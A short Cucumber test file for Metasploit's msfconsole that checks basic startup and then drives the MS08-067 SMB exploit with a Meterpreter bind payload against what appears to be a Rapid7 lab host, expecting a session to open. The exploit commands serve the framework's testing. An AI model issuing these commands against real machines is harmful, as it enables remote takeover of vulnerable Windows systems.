Feature: Testing msfconsole, yay!

  @msfconsole
  Scenario: msfconsole starts and is not horribly broken
    When I type "help"
    And I type "exit"
    Then the output should contain:
      """
      Commands
      """

   @msfconsole
  Scenario: Test driving a module
    When I type "use exploit/windows/smb/ms08_067_netapi"
    And I type "set RHOST w2k3sp2-x86-u.vuln.lax.rapid7.com"
    And I type "set PAYLOAD windows/meterpreter/bind_tcp"
    And I type "run"
    And I type "exit"
    And I type "exit"
    Then the output should match /Meterpreter session \d+ opened/
